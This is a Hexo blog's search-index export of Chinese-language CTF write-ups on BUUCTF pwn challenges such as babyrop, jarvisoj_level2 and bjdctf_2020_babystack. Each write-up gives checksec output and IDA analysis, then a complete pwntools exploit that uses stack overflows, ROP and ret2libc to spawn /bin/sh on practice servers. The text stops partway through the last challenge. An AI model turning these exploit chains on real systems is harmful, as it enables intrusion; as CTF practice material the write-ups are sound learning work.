<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>寒假pwn题第四天</title>
    <link href="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/"/>
    <url>/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h3><p>check,没有canary保护，nx保护开启排除shellcode可能性，FULL RELEO为地址随机化。:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Full</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>主函数的思路大概是：生成一个随机数，把这个随机数作为参数传进sub_804871F()函数里，然后将该函数返回的结果作为参数再传进sub_80487D0()里</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215319893.png" class title="image-20230213215319893"><p>sprintf（）函数将生成的随机数a1加到了s[32]的数组中。这里题目有read函数，但是没有栈溢出的可能，读入buf之后，读取buf的长度，然后比较buf和s字符串的大小（比较长度为前v1个字符）。此时如果strncmp（）的结果不为0，则直接退出程序。因此我们第一个目的：使strncmp结果为0</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215440021.png" class title="image-20230213215440021"><p>sub_804871F()函数会将buf[7]作为参数传进来，将它的ASCII码比对，看到全程序中唯一一个存在栈溢出漏洞可能性的地方。但是必须满足a1的ASCII码值能达到栈溢出的大小。第二个目的：使a1的ASCII码值（sub_804871F()函数里的buf[7]的ASCII码值尽量大）</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213215551011.png" class title="image-20230213215551011"><p>附上exp:</p><p>参考文章:[(74条消息) BUUCTF–[OGeek2019]babyrop_Loτυs的博客-CSDN博客_[ogeek2019]babyrop](<a href="https://blog.csdn.net/Invin_cible/article/details/121322885?ops_request_misc=%7B%22request_id%22:%22167629620016800222825803%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167629620016800222825803&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121322885-null-null.142%5Ev73%5Einsert_down3,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=buuctf">https://blog.csdn.net/Invin_cible/article/details/121322885?ops_request_misc=%7B%22request%5Fid%22%3A%22167629620016800222825803%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167629620016800222825803&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121322885-null-null.142^v73^insert_down3,201^v4^add_ask,239^v1^control&amp;utm_term=buuctf</a> babyrop&amp;spm&#x3D;1018.2226.3001.4187)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,25501)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu共享文件夹/BUUCTF/pwnn2&#x27;</span>)<br>payload = <span class="hljs-string">&#x27;\x00&#x27;</span>+<span class="hljs-string">&#x27;\xff&#x27;</span><span class="hljs-number">*7</span><br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>main_addr = 0x08048825<br>payload1 = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>xe7+b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*4</span>+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)<br>r.sendline(payload1)<br>write_addr = u32(r.recv(4))<br><span class="hljs-built_in">print</span>(hex(write_addr))<br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>,write_addr)<br>libc_base = write_addr -  libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<br>system_addr = libc_base+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>bin_sh_addr = libc_base+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2 = b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*0</span>xe7+b<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*4</span>+p32(system_addr)+p32(0)+p32(bin_sh_addr)<br>r.sendline(payload2)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h3><p>经典check:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>跟那个32位的没啥区别,只是参数进栈方式不同，附上exp:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br><span class="hljs-comment">#p=process(&quot;level2_x64&quot;)</span><br><span class="hljs-attribute">p</span>=remote(&quot;node4.buuoj.cn&quot;,27665)<br><span class="hljs-attribute">pop_rdi_ret</span>=0x00000000004006b3<br><br><span class="hljs-attribute">system</span>=0x4004C0<br><span class="hljs-attribute">str_bin_sh</span>=0x600A90<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x88)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system)<br><br>p.recvuntil(<span class="hljs-string">&quot;:\n&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h3><p>经典check:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>shift+f12,查看关键字符串</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213220847435.png" class title="image-20230213220847435"><p>双击，ctrl+x，进入反汇编代码：</p><img src="/2023/02/13/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E5%9B%9B%E5%A4%A9/image-20230213220935498.png" class title="image-20230213220935498"><p>ROPgadget查看返回地址，附上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding = utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#from LibcSearcher import*</span><br> <br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>,arch = <span class="hljs-string">&#x27;i386&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>content = <span class="hljs-number">0</span><br>elf = ELF(<span class="hljs-string">&quot;babyrop2&quot;</span>)<br>lib = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><span class="hljs-keyword">if</span> content == <span class="hljs-number">1</span>:<br>p = process(<span class="hljs-string">&#x27;babyrop2&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27333</span>)<br><br>main_addr = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>got_addr  = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>plt_addr  = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>pop_rdi   = <span class="hljs-number">0x0400733</span><br>pop_r15   = <span class="hljs-number">0x0400731</span><br>format_   = <span class="hljs-number">0x0400770</span><br>ret_addr  = <span class="hljs-number">0x04004d1</span><br><br>payload   = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x20</span>+<span class="hljs-number">0x8</span>) + p64(pop_rdi) + p64(format_) + p64(pop_r15) + p64(got_addr) + p64(<span class="hljs-number">0</span>) + p64(plt_addr) + p64(main_addr)<br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br>write_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br><br><span class="hljs-comment">#lib</span><br><br>lib_write  = lib.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>lib_system = lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>lib_binsh  = <span class="hljs-built_in">next</span>(lib.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br> <br>base_addr   = write_addr - lib_write<br>system_addr = base_addr + lib_system<br>binsh_addr  = base_addr + lib_binsh<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">0x8</span>) + p64(ret_addr)+ p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)<br>p.recvuntil(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>)<br>p.sendline(payload)<br><br><br>p.interactive()<br>main() <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn题第三天</title>
    <link href="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
    <url>/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><p>经典拿到题先check一下，32位，只开了nx保护:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>shift+f12查看字符串信息，直接看到了system和&#x2F;bin&#x2F;sh</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205180438095.png" alt="image-20230205180438095"></p><p>那一下就很清晰了，直接利用这些去构造system(&#x2F;bin&#x2F;sh)，只需要找到一个输入点就可以了，先看一下main函数，里面有一个vulnerable_fuction，跟进后发现了输入点。</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205180900543.png" alt="image-20230205180900543"></p><p>直接写exp:</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25870</span>)  <br>elf = ELF(<span class="hljs-string">&#x27;./jarvisoj_level2&#x27;</span>)  <br><br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-number">0x0804a024</span><br>main_addr = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">136</span>+<span class="hljs-number">4</span>) + p32(system_addr)+p32(main_addr)+p32(binsh_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h3><p>64位程序，只开了nx保护:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>shift+f12查看字符串，发现&#x2F;bin&#x2F;sh</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205181702275.png" alt="image-20230205181702275"></p><p>跟进之后找到后门函数:</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205181725468.png" alt="image-20230205181725468"></p><p>也就是这个backdoor了:</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182537277.png" alt="image-20230205182537277"></p><p>查看main函数，发现有俩输入,这两个nbyes我自己也没太搞懂，就刷了刷别人的wp，但是别人写的仍然感觉云里雾里，搞了半天才明白，原来第二次输入的那个buf的数据长度由我们第一次输入的nbytes来控制。</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182159480.png" alt="image-20230205182159480"></p><p>附上exp:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">p</span>=remote(&#x27;node4.buuoj.cn&#x27;,28787)<br><span class="hljs-attribute">shell_addr</span>=0x4006e6<br><br>p.sendline(<span class="hljs-string">&#x27;100&#x27;</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0x10+8)+p64(shell_addr)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h3><p>例行检查，32位，只开了nx保护(你们这三道题还真是出奇的一致呢&#x3D; &#x3D;):</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>shift+f12查看字符串，直接看到了flag.txt。哇，是幸福的味道:</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182841310.png" alt="image-20230205182841310"></p><p>跟进过后，发现这个函数的意思大概就是让a1&#x3D;0x308cd64f，a2&#x3D;0x195719d1<img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205182906447.png" alt="image-20230205182906447"></p><p>本以为是一道平平无奇的题目，结果看了一下a1,a2的位置，居然在00000000的后面，没法利用溢出控制，直接懵逼。又去看了别人的wp，发现好多人都在用什么mprotect函数跳过bss，额，可是我太菜了搞不太懂QAQ。又是一番搜寻，终于找到了一个弄的懂的wp。</p><p>这边我们要想办法绕过这个if判断，tap+空格来到这个界面，看到从0x80489bb开始，程序开始设置打开flag.txt的参数，我们只要将程序执行流跳转到这里就可以读出flag:</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205183455880.png" alt="image-20230205183455880"></p><p>不得不服网上大佬的强大。找到函数中的输入点，溢出覆盖返回地址。</p><p><img src="/2023/02/05/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%B8%89%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第三天\image-20230205183811164.png" alt="image-20230205183811164"></p><p>exp如下:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span>*<br><br><span class="hljs-variable">p</span>=<span class="hljs-function"><span class="hljs-title">process</span>(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="hljs-variable">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span><span class="hljs-variable">x38</span>+<span class="hljs-function"><span class="hljs-title">p32</span>(<span class="hljs-number">0</span><span class="hljs-variable">x80489bb</span>)</span><br><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload</span>)<br><br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>寒假pwn题第二天</title>
    <link href="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <url>/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题"><a href="#BUUCTF刷题" class="headerlink" title="BUUCTF刷题"></a>BUUCTF刷题</h1><h3 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h3><p>首先还是check:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>IDA打开后，shift+f12查看字符串f看到了&#x2F;bin&#x2F;sh:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129154915239.png" alt="image-20230129154915239"></p><p>双击，发现了&#x2F;bin&#x2F;sh在函数callsystem()中:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155107710.png" alt="image-20230129155107710"></p><p>查看该函数，发现含有system(“&#x2F;bin&#x2F;sh”)，同时发现main里只有一个write，和一个返回语句</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155228230.png" alt="image-20230129155228230"></p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155234812.png" alt="image-20230129155234812"></p><p>打开返回函数，发现read可以读入0x200的字符串，再看一下buf的长度是0x80，存在溢出</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155351770.png" alt="image-20230129155351770"></p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155403160.png" alt="image-20230129155403160"></p><p>回看后门函数callsystem的函数地址为0x400596:</p><p><img src="/2023/01/29/%E5%AF%92%E5%81%87pwn%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%A4%A9/Workspaces\hexo\source_posts\寒假pwn题第二天\image-20230129155604148.png" alt="image-20230129155604148"></p><p>构造exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;26880&#x27;</span>)<br> <br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0x400596</span>)<br><br>p.sendline(payload)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h3><p>经典check环节:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span 